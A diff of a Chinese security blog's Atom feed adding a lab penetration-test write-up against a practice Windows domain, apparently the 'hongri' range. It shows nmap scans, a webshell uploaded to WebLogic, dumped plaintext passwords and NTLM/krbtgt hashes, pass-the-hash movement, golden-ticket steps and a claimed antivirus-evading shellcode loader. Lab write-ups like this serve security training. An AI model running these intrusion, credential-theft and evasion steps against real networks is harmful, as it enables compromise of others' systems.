@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://www.yyxyy.xyz/</id>
     <title>Yyx</title>
-    <updated>2021-08-30T07:05:51.143Z</updated>
+    <updated>2021-10-09T01:32:56.206Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://www.yyxyy.xyz/"/>
     <link rel="self" href="https://www.yyxyy.xyz/atom.xml"/>
@@ -10,6 +10,758 @@
     <logo>https://www.yyxyy.xyz/images/avatar.png</logo>
     <icon>https://www.yyxyy.xyz/favicon.ico</icon>
     <rights>All rights reserved 2021, Yyx</rights>
+    <entry>
+        <title type="html"><![CDATA[靶场练习2]]></title>
+        <id>https://www.yyxyy.xyz/post/ba-chang-lian-xi-2/</id>
+        <link href="https://www.yyxyy.xyz/post/ba-chang-lian-xi-2/">
+        </link>
+        <updated>2021-10-09T01:29:01.000Z</updated>
+        <summary type="html"><![CDATA[<h1 id="0x01-环境准备">0x01 环境准备</h1>
+<p>1.kali外网攻击机，win10外网攻击机</p>
+<p>2.win2008  R2 双网卡1，开启weblogic服务</p>
+<p>3.win7，双网卡</p>
+<p>4.win2012 R2 仅主机模式</p>
+<h1 id="0x02-信息收集">0x02 信息收集</h1>
+<p>1.win2008</p>
+<pre><code class="language-shell">Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-20 07:40 EDT
+Nmap scan report for 192.168.227.131
+Host is up (0.00047s latency).
+Not shown: 989 filtered ports
+PORT      STATE SERVICE        VERSION
+80/tcp    open  http           Microsoft IIS httpd 7.5
+135/tcp   open  msrpc          Microsoft Windows RPC
+139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+1433/tcp  open  ms-sql-s       Microsoft SQL Server 2008 R2 10.50.4000; SP2
+3389/tcp  open  ms-wbt-server?
+7001/tcp  open  http           Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled)
+49152/tcp open  msrpc          Microsoft Windows RPC
+49153/tcp open  msrpc          Microsoft Windows RPC
+49154/tcp open  msrpc          Microsoft Windows RPC
+49155/tcp open  msrpc          Microsoft Windows RPC
+MAC Address: 00:0C:29:17:20:A8 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Microsoft Windows 7
+OS CPE: cpe:/o:microsoft:windows_7
+OS details: Microsoft Windows 7
+Network Distance: 1 hop
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 73.74 seconds
+</code></pre>
+<p>2.win7</p>
+<pre><code class="language-shell">Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-20 07:54 EDT
+Nmap scan report for 192.168.227.130
+Host is up (0.00047s latency).
+Not shown: 992 closed ports
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: DE1AY)
+3389/tcp  open  tcpwrapped
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49161/tcp open  msrpc        Microsoft Windows RPC
+MAC Address: 00:0C:29:0A:C1:79 (VMware)
+Device type: general purpose
+Running: Microsoft Windows Vista|7|8.1
+OS CPE: cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_8.1
+OS details: Microsoft Windows Vista, Windows 7 SP1, or Windows 8.1 Update 1
+Network Distance: 1 hop
+Service Info: Host: PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 68.74 seconds
+</code></pre>
+<p>3.发现121.137存在7001端口，尝试扫描漏洞。</p>
+<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/1.png" alt="1632140760712" loading="lazy"></figure>
+<p>4.发现均打开445端口，但是不存在漏洞</p>
+<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/2.png" alt="1632141297037" loading="lazy"></figure>
+<h1 id="0x03-漏洞利用">0x03 漏洞利用</h1>
+<p>上传冰蝎马：</p>
+<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/3.png" alt="1632142789764" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/4.png" alt="1632142885873" loading="lazy"></figure>
+<h1 id="0x04-主机信息收集">0x04 主机信息收集</h1>
+<p>administrator权限、存在域、双网卡</p>
+<pre><code class="language-shell">C:/Oracle/Middleware/user_projects/domains/base_domain/ &gt;whoami
+de1ay\administrator
+
+C:/Oracle/Middleware/user_projects/domains/base_domain/ &gt;ipconfig/all
+
+Windows IP 配置
+
+   主机名  . . . . . . . . . . . . . : WEB
+   主 DNS 后缀 . . . . . . . . . . . : de1ay.com
+   节点类型  . . . . . . . . . . . . : 混合
+   IP 路由已启用 . . . . . . . . . . : 否
+   WINS 代理已启用 . . . . . . . . . : 否
+   DNS 后缀搜索列表  . . . . . . . . : de1ay.com
+                                       localdomain
+
+以太网适配器 本地连接 2:
+
+   连接特定的 DNS 后缀 . . . . . . . : 
+   描述. . . . . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection #2
+   物理地址. . . . . . . . . . . . . : 00-0C-29-17-20-B2
+   DHCP 已启用 . . . . . . . . . . . : 否
+   自动配置已启用. . . . . . . . . . : 是
+   本地链接 IPv6 地址. . . . . . . . : fe80::189d:8528:d537:fa88%13(首选) 
+   IPv4 地址 . . . . . . . . . . . . : 10.10.10.80(首选) 
+   子网掩码  . . . . . . . . . . . . : 255.255.255.0
+   默认网关. . . . . . . . . . . . . : 10.10.10.1
+   DHCPv6 IAID . . . . . . . . . . . : 301993001
+   DHCPv6 客户端 DUID  . . . . . . . : 00-01-00-01-25-06-97-6A-00-0C-29-68-D3-5F
+   DNS 服务器  . . . . . . . . . . . : 10.10.10.10
+   TCPIP 上的 NetBIOS  . . . . . . . : 已启用
+
+以太网适配器 本地连接:
+
+   连接特定的 DNS 后缀 . . . . . . . : localdomain
+   描述. . . . . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
+   物理地址. . . . . . . . . . . . . : 00-0C-29-17-20-A8
+   DHCP 已启用 . . . . . . . . . . . : 是
+   自动配置已启用. . . . . . . . . . : 是
+   本地链接 IPv6 地址. . . . . . . . : fe80::f017:d7f6:4a44:3137%11(首选) 
+   IPv4 地址 . . . . . . . . . . . . : 192.168.227.131(首选) 
+   子网掩码  . . . . . . . . . . . . : 255.255.255.0
+   获得租约的时间  . . . . . . . . . : 2021年9月21日 14:46:47
+   租约过期的时间  . . . . . . . . . : 2021年9月21日 15:46:46
+   默认网关. . . . . . . . . . . . . : 192.168.227.2
+   DHCP 服务器 . . . . . . . . . . . : 192.168.227.254
+   DHCPv6 IAID . . . . . . . . . . . : 234884137
+   DHCPv6 客户端 DUID  . . . . . . . : 00-01-00-01-25-06-97-6A-00-0C-29-68-D3-5F
+   DNS 服务器  . . . . . . . . . . . : 10.10.10.10
+   主 WINS 服务器  . . . . . . . . . : 192.168.227.2
+   TCPIP 上的 NetBIOS  . . . . . . . : 已启用
+
+隧道适配器 isatap.{AD80CD23-D97F-4814-A715-9248D845EA0F}:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : 
+   描述. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter
+   物理地址. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP 已启用 . . . . . . . . . . . : 否
+   自动配置已启用. . . . . . . . . . : 是
+
+隧道适配器 isatap.localdomain:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : localdomain
+   描述. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter #2
+   物理地址. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP 已启用 . . . . . . . . . . . : 否
+   自动配置已启用. . . . . . . . . . : 是
+</code></pre>
+<p>win2008 R2默认可以抓明文密码</p>
+<pre><code class="language-shell">C:/Oracle/Middleware/user_projects/domains/base_domain/ &gt;systeminfo
+
+主机名:           WEB
+OS 名称:          Microsoft Windows Server 2008 R2 Standard 
+OS 版本:          6.1.7601 Service Pack 1 Build 7601
+OS 制造商:        Microsoft Corporation
+OS 配置:          成员服务器
+OS 构件类型:      Multiprocessor Free
+注册的所有人:     Windows 用户
+注册的组织:       
+产品 ID:          00477-001-0000421-84103
+初始安装日期:     2019/9/8, 19:01:04
+系统启动时间:     2021/9/20, 17:10:08
+系统制造商:       VMware, Inc.
+系统型号:         VMware Virtual Platform
+系统类型:         x64-based PC
+处理器:           安装了 1 个处理器。
+                  [01]: Intel64 Family 6 Model 158 Stepping 9 GenuineIntel ~2501 Mhz
+BIOS 版本:        Phoenix Technologies LTD 6.00, 2017/5/19
+Windows 目录:     C:\Windows
+系统目录:         C:\Windows\system32
+启动设备:         \Device\HarddiskVolume1
+系统区域设置:     zh-cn;中文(中国)
+输入法区域设置:   zh-cn;中文(中国)
+时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐
+物理内存总量:     2,047 MB
+可用的物理内存:   909 MB
+虚拟内存: 最大值: 4,095 MB
+虚拟内存: 可用:   2,800 MB
+虚拟内存: 使用中: 1,295 MB
+页面文件位置:     C:\pagefile.sys
+域:               de1ay.com
+登录服务器:       暂缺
+修补程序:         安装了 3 个修补程序。
+                  [01]: KB2999226
+                  [02]: KB958488
+                  [03]: KB976902
+网卡:             安装了 2 个 NIC。
+                  [01]: Intel(R) PRO/1000 MT Network Connection
+                      连接名:      本地连接
+                      启用 DHCP:   是
+                      DHCP 服务器: 192.168.227.254
+                      IP 地址
+                        [01]: 192.168.227.131
+                        [02]: fe80::f017:d7f6:4a44:3137
+                  [02]: Intel(R) PRO/1000 MT Network Connection
+                      连接名:      本地连接 2
+                      启用 DHCP:   否
+                      IP 地址
+                        [01]: 10.10.10.80
+                        [02]: fe80::189d:8528:d537:fa88
+</code></pre>
+<p>网卡:             安装了 2 个 NIC。<br>
+<a href="KB2999226">01</a>: Intel(R) PRO/1000 MT Network Connection<br>
+连接名:      本地连接<br>
+启用 DHCP:   是<br>
+DHCP 服务器: 192.168.227.254<br>
+IP 地址<br>
+<a href="KB2999226">01</a>: 192.168.227.131<br>
+<a href="KB958488">02</a>: fe80::f017:d7f6:4a44:3137<br>
+​                  <a href="KB958488">02</a>: Intel(R) PRO/1000 MT Network Connection<br>
+​                      连接名:      本地连接 2<br>
+​                      启用 DHCP:   否<br>
+​                      IP 地址<br>
+<a href="KB2999226">01</a>: 10.10.10.80<br>
+<a href="KB958488">02</a>: fe80::189d:8528:d537:fa88</p>
+<p>查看进程，发现存在360的主动防御</p>
+<pre><code class="language-shell">C:/Oracle/Middleware/user_projects/domains/base_domain/ &gt;tasklist/svc
+
+映像名称                       PID 服务                                        
+========================= ======== ============================================
+System Idle Process              0 暂缺                                        
+System                           4 暂缺                                        
+smss.exe                       256 暂缺                                        
+csrss.exe                      344 暂缺                                        
+wininit.exe                    404 暂缺                                        
+services.exe                   500 暂缺                                        
+lsass.exe                      508 Netlogon, SamSs                             
+lsm.exe                        516 暂缺                                        
+svchost.exe                    604 DcomLaunch, PlugPlay, Power                 
+vmacthlp.exe                   664 VMware Physical Disk Helper Service         
+svchost.exe                    708 RpcEptMapper, RpcSs                         
+svchost.exe                    796 Dhcp, eventlog, lmhosts                     
+svchost.exe                    848 AeLookupSvc, Appinfo, CertPropSvc, gpsvc,   
+                                   IKEEXT, iphlpsvc, LanmanServer, ProfSvc,    
+                                   Schedule, SENS, SessionEnv,                 
+                                   ShellHWDetection, Winmgmt, wuauserv         
+svchost.exe                    912 EventSystem, netprofm, nsi, sppuinotify,    
+                                   W32Time                                     
+svchost.exe                    952 Netman, TrkWks, UmRdpService, UxSms         
+ZhuDongFangYu.exe              988 ZhuDongFangYu                               
+svchost.exe                    124 CryptSvc, Dnscache, LanmanWorkstation,      
+                                   NlaSvc                                      
+svchost.exe                    264 BFE, DPS, MpsSvc                            
+spoolsv.exe                   1180 Spooler                                     
+svchost.exe                   1212 AppHostSvc                                  
+sqlservr.exe                  1400 MSSQL$SQLEXPRESS                            
+SMSvcHost.exe                 1480 NetPipeActivator, NetTcpActivator,          
+                                   NetTcpPortSharing                           
+sqlwriter.exe                 1900 SQLWriter                                   
+VGAuthService.exe             1948 VGAuthService                               
+vmtoolsd.exe                  1988 VMTools                                     
+svchost.exe                   2028 W3SVC, WAS                                  
+fdlauncher.exe                1760 MSSQLFDLauncher$SQLEXPRESS                  
+svchost.exe                   1740 TermService                                 
+svchost.exe                   1876 PolicyAgent                                 
+fdhost.exe                     836 暂缺                                        
+conhost.exe                    888 暂缺                                        
+dllhost.exe                   2244 COMSysApp                                   
+msdtc.exe                     2420 MSDTC                                       
+WmiPrvSE.exe                  2620 暂缺                                        
+sppsvc.exe                    2124 sppsvc                                      
+csrss.exe                      968 暂缺                                        
+winlogon.exe                  2472 暂缺                                        
+taskhost.exe                  3048 暂缺                                        
+dwm.exe                       1608 暂缺                                        
+explorer.exe                  1712 暂缺                                        
+vmtoolsd.exe                  3008 暂缺                                        
+cmd.exe                       3060 暂缺                                        
+conhost.exe                   2924 暂缺                                        
+mmc.exe                       2580 暂缺                                        
+TrustedInstaller.exe          1476 TrustedInstaller                            
+cmd.exe                       2428 暂缺                                        
+conhost.exe                   2264 暂缺                                        
+java.exe                       496 暂缺                                        
+cmd.exe                        488 暂缺                                        
+conhost.exe                   2692 暂缺                                        
+sc.exe                        2104 暂缺                                        
+cmd.exe                       1796 暂缺                                        
+conhost.exe                   3020 暂缺                                        
+sc.exe                        3004 暂缺                                        
+cmd.exe                       2600 暂缺                                        
+conhost.exe                   2788 暂缺                                        
+sc.exe                        2524 暂缺                                        
+cmd.exe                        292 暂缺                                        
+conhost.exe                    336 暂缺                                        
+sc.exe                         356 暂缺                                        
+cmd.exe                       1468 暂缺                                        
+conhost.exe                   1824 暂缺                                        
+tasklist.exe                  2164 暂缺 
+</code></pre>
+<p>尝试上线cs</p>
+<p>存在360，所以需要免杀的马，这里我使用我写的shellcodeloader，完美过360.</p>
+<figure data-type="image" tabindex="5"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/5.png" alt="1632211789400" loading="lazy"></figure>
+<h1 id="0x05-内网信息收集以及横向">0x05 内网信息收集以及横向</h1>
+<p>密码抓取，发现域控DC登录过。</p>
+<pre><code class="language-shell">Authentication Id : 0 ; 9556781 (00000000:0091d32d)
+Session           : CachedInteractive from 2
+User Name         : Administrator
+Domain            : DE1AY
+Logon Server      : DC
+Logon Time        : 2021/9/21 15:40:41
+SID               : S-1-5-21-2756371121-2868759905-3853650604-500
+	msv :	
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : DE1AY
+	 * LM       : f67ce55ac831223dc187b8085fe1d9df
+	 * NTLM     : 161cff084477fe596a5db81874498a24
+	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
+	tspkg :	
+	 * Username : Administrator
+	 * Domain   : DE1AY
+	 * Password : 1qaz@WSX
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : DE1AY
+	 * Password : 1qaz@WSX
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : de1ay.com
+	 * Password : 1qaz@WSX
+	ssp :	
+	credman :
+</code></pre>
+<p>使用net view以及hash传递上线。</p>
+<figure data-type="image" tabindex="6"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/6.png" alt="1632216003567" loading="lazy"></figure>
+<h1 id="0x06-域权限维持">0x06 域权限维持</h1>
+<p>域控密码抓取</p>
+<pre><code class="language-shell">Authentication Id : 0 ; 226447 (00000000:0003748f)
+Session           : Interactive from 1
+User Name         : de1ay
+Domain            : DE1AY
+Logon Server      : DC
+Logon Time        : 2021/9/20 17:12:55
+SID               : S-1-5-21-2756371121-2868759905-3853650604-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : de1ay
+	 * Domain   : DE1AY
+	 * NTLM     : 161cff084477fe596a5db81874498a24
+	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
+	 [00010000] CredentialKeys
+	 * NTLM     : 161cff084477fe596a5db81874498a24
+	 * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
+	tspkg :	
+	wdigest :	
+	 * Username : de1ay
+	 * Domain   : DE1AY
+	 * Password : (null)
+	kerberos :	
+	 * Username : de1ay
+	 * Domain   : DE1AY.COM
+	 * Password : (null)
+	ssp :	KO
+	credman :
+	
+beacon&gt; hashdump
+[*] Tasked beacon to dump hashes
+[+] host called home, sent: 82501 bytes
+[+] received password hashes:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:82dfc71b72a11ef37d663047bc2088fb:::
+de1ay:1001:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
+mssql:2103:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
+DC$:1002:aad3b435b51404eeaad3b435b51404ee:191fbaef80e1b2641b0e79f03c634ce4:::
+PC$:1105:aad3b435b51404eeaad3b435b51404ee:288707796e6021d379ae70f0acd53e88:::
+WEB$:1603:aad3b435b51404eeaad3b435b51404ee:6aeba9f5141c4f8d47a1c26173aecb26:::
+</code></pre>
+<p>​</p>
+<p>伪造黄金票据</p>
+<p>条件：</p>
+<p>1.域名称</p>
+<p>2.域的SID值</p>
+<p>3.域的KRBTGT账户NTLM密码哈希</p>
+<p>4.伪造用户名</p>
+<p>具体操作参考：https://blog.csdn.net/qq_32731075/article/details/118193887</p>
+<figure data-type="image" tabindex="7"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/7.png" alt="1632220218868" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/8.png" alt="1632220391203" loading="lazy"></figure>
+]]></summary>
+        <content type="html"><![CDATA[<h1 id="0x01-环境准备">0x01 环境准备</h1>
+<p>1.kali外网攻击机，win10外网攻击机</p>
+<p>2.win2008  R2 双网卡1，开启weblogic服务</p>
+<p>3.win7，双网卡</p>
+<p>4.win2012 R2 仅主机模式</p>
+<h1 id="0x02-信息收集">0x02 信息收集</h1>
+<p>1.win2008</p>
+<pre><code class="language-shell">Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-20 07:40 EDT
+Nmap scan report for 192.168.227.131
+Host is up (0.00047s latency).
+Not shown: 989 filtered ports
+PORT      STATE SERVICE        VERSION
+80/tcp    open  http           Microsoft IIS httpd 7.5
+135/tcp   open  msrpc          Microsoft Windows RPC
+139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+1433/tcp  open  ms-sql-s       Microsoft SQL Server 2008 R2 10.50.4000; SP2
+3389/tcp  open  ms-wbt-server?
+7001/tcp  open  http           Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled)
+49152/tcp open  msrpc          Microsoft Windows RPC
+49153/tcp open  msrpc          Microsoft Windows RPC
+49154/tcp open  msrpc          Microsoft Windows RPC
+49155/tcp open  msrpc          Microsoft Windows RPC
+MAC Address: 00:0C:29:17:20:A8 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Microsoft Windows 7
+OS CPE: cpe:/o:microsoft:windows_7
+OS details: Microsoft Windows 7
+Network Distance: 1 hop
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 73.74 seconds
+</code></pre>
+<p>2.win7</p>
+<pre><code class="language-shell">Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-20 07:54 EDT
+Nmap scan report for 192.168.227.130
+Host is up (0.00047s latency).
+Not shown: 992 closed ports
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: DE1AY)
+3389/tcp  open  tcpwrapped
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49161/tcp open  msrpc        Microsoft Windows RPC
+MAC Address: 00:0C:29:0A:C1:79 (VMware)
+Device type: general purpose
+Running: Microsoft Windows Vista|7|8.1
+OS CPE: cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_8.1
+OS details: Microsoft Windows Vista, Windows 7 SP1, or Windows 8.1 Update 1
+Network Distance: 1 hop
+Service Info: Host: PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 68.74 seconds
+</code></pre>
+<p>3.发现121.137存在7001端口，尝试扫描漏洞。</p>
+<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/1.png" alt="1632140760712" loading="lazy"></figure>
+<p>4.发现均打开445端口，但是不存在漏洞</p>
+<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/2.png" alt="1632141297037" loading="lazy"></figure>
+<h1 id="0x03-漏洞利用">0x03 漏洞利用</h1>
+<p>上传冰蝎马：</p>
+<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/3.png" alt="1632142789764" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/%E9%9D%B6%E5%9C%BA/hongri/4.png" alt="1632142885873" loading="lazy"></figure>
+<h1 id="0x04-主机信息收集">0x04 主机信息收集</h1>
+<p>administrator权限、存在域、双网卡</p>
+<pre><code class="language-shell">C:/Oracle/Middleware/user_projects/domains/base_domain/ &gt;whoami
+de1ay\administrator
+
+C:/Oracle/Middleware/user_projects/domains/base_domain/ &gt;ipconfig/all
+
+Windows IP 配置
+
+   主机名  . . . . . . . . . . . . . : WEB
+   主 DNS 后缀 . . . . . . . . . . . : de1ay.com
+   节点类型  . . . . . . . . . . . . : 混合
+   IP 路由已启用 . . . . . . . . . . : 否
+   WINS 代理已启用 . . . . . . . . . : 否
+   DNS 后缀搜索列表  . . . . . . . . : de1ay.com
+                                       localdomain
+
+以太网适配器 本地连接 2:
+
+   连接特定的 DNS 后缀 . . . . . . . : 
+   描述. . . . . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection #2
+   物理地址. . . . . . . . . . . . . : 00-0C-29-17-20-B2
+   DHCP 已启用 . . . . . . . . . . . : 否
+   自动配置已启用. . . . . . . . . . : 是
+   本地链接 IPv6 地址. . . . . . . . : fe80::189d:8528:d537:fa88%13(首选) 
+   IPv4 地址 . . . . . . . . . . . . : 10.10.10.80(首选) 
+   子网掩码  . . . . . . . . . . . . : 255.255.255.0
+   默认网关. . . . . . . . . . . . . : 10.10.10.1
+   DHCPv6 IAID . . . . . . . . . . . : 301993001
+   DHCPv6 客户端 DUID  . . . . . . . : 00-01-00-01-25-06-97-6A-00-0C-29-68-D3-5F
+   DNS 服务器  . . . . . . . . . . . : 10.10.10.10
+   TCPIP 上的 NetBIOS  . . . . . . . : 已启用
+
+以太网适配器 本地连接:
+
+   连接特定的 DNS 后缀 . . . . . . . : localdomain
+   描述. . . . . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
+   物理地址. . . . . . . . . . . . . : 00-0C-29-17-20-A8
+   DHCP 已启用 . . . . . . . . . . . : 是
+   自动配置已启用. . . . . . . . . . : 是
+   本地链接 IPv6 地址. . . . . . . . : fe80::f017:d7f6:4a44:3137%11(首选) 
+   IPv4 地址 . . . . . . . . . . . . : 192.168.227.131(首选) 
+   子网掩码  . . . . . . . . . . . . : 255.255.255.0
+   获得租约的时间  . . . . . . . . . : 2021年9月21日 14:46:47
+   租约过期的时间  . . . . . . . . . : 2021年9月21日 15:46:46
+   默认网关. . . . . . . . . . . . . : 192.168.227.2
+   DHCP 服务器 . . . . . . . . . . . : 192.168.227.254
+   DHCPv6 IAID . . . . . . . . . . . : 234884137
+   DHCPv6 客户端 DUID  . . . . . . . : 00-01-00-01-25-06-97-6A-00-0C-29-68-D3-5F
+   DNS 服务器  . . . . . . . . . . . : 10.10.10.10
+   主 WINS 服务器  . . . . . . . . . : 192.168.227.2
+   TCPIP 上的 NetBIOS  . . . . . . . : 已启用
+
+隧道适配器 isatap.{AD80CD23-D97F-4814-A715-9248D845EA0F}:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : 
+   描述. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter
+   物理地址. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP 已启用 . . . . . . . . . . . : 否
+   自动配置已启用. . . . . . . . . . : 是
+
+隧道适配器 isatap.localdomain:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : localdomain
+   描述. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter #2
+   物理地址. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP 已启用 . . . . . . . . . . . : 否
+   自动配置已启用. . . . . . . . . . : 是
+</code></pre>
+<p>win2008 R2默认可以抓明文密码</p>
+<pre><code class="language-shell">C:/Oracle/Middleware/user_projects/domains/base_domain/ &gt;systeminfo
+
+主机名:           WEB
+OS 名称:          Microsoft Windows Server 2008 R2 Standard 
+OS 版本:          6.1.7601 Service Pack 1 Build 7601
+OS 制造商:        Microsoft Corporation
+OS 配置:          成员服务器
+OS 构件类型:      Multiprocessor Free
+注册的所有人:     Windows 用户
+注册的组织:       
+产品 ID:          00477-001-0000421-84103
+初始安装日期:     2019/9/8, 19:01:04
+系统启动时间:     2021/9/20, 17:10:08
+系统制造商:       VMware, Inc.
+系统型号:         VMware Virtual Platform
+系统类型:         x64-based PC
+处理器:           安装了 1 个处理器。
+                  [01]: Intel64 Family 6 Model 158 Stepping 9 GenuineIntel ~2501 Mhz
+BIOS 版本:        Phoenix Technologies LTD 6.00, 2017/5/19
+Windows 目录:     C:\Windows
+系统目录:         C:\Windows\system32
+启动设备:         \Device\HarddiskVolume1
+系统区域设置:     zh-cn;中文(中国)
+输入法区域设置:   zh-cn;中文(中国)
+时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐
+物理内存总量:     2,047 MB
+可用的物理内存:   909 MB
+虚拟内存: 最大值: 4,095 MB
+虚拟内存: 可用:   2,800 MB
+虚拟内存: 使用中: 1,295 MB
+页面文件位置:     C:\pagefile.sys
+域:               de1ay.com
+登录服务器:       暂缺
+修补程序:         安装了 3 个修补程序。
+                  [01]: KB2999226
+                  [02]: KB958488
+                  [03]: KB976902
+网卡:             安装了 2 个 NIC。
+                  [01]: Intel(R) PRO/1000 MT Network Connection
+                      连接名:      本地连接
+                      启用 DHCP:   是
+                      DHCP 服务器: 192.168.227.254
+                      IP 地址
+                        [01]: 192.168.227.131
+                        [02]: fe80::f017:d7f6:4a44:3137
+                  [02]: Intel(R) PRO/1000 MT Network Connection
+                      连接名:      本地连接 2
+                      启用 DHCP:   否
+                      IP 地址
+                        [01]: 10.10.10.80
+                        [02]: fe80::189d:8528:d537:fa88
+</code></pre>
+<p>网卡:             安装了 2 个 NIC。<br>
+<a href="KB2999226">01</a>: Intel(R) PRO/1000 MT Network Connection<br>
+连接名:      本地连接<br>
+启用 DHCP:   是<br>
+DHCP 服务器: 192.168.227.254<br>
+IP 地址<br>
+<a href="KB2999226">01</a>: 192.168.227.131<br>
+<a href="KB958488">02</a>: fe80::f017:d7f6:4a44:3137<br>
+​                  <a href="KB958488">02</a>: Intel(R) PRO/1000 MT Network Connection<br>
+​                      连接名:      本地连接 2<br>
+​                      启用 DHCP:   否<br>
+​                      IP 地址<br>
+<a href="KB2999226">01</a>: 10.10.10.80<br>
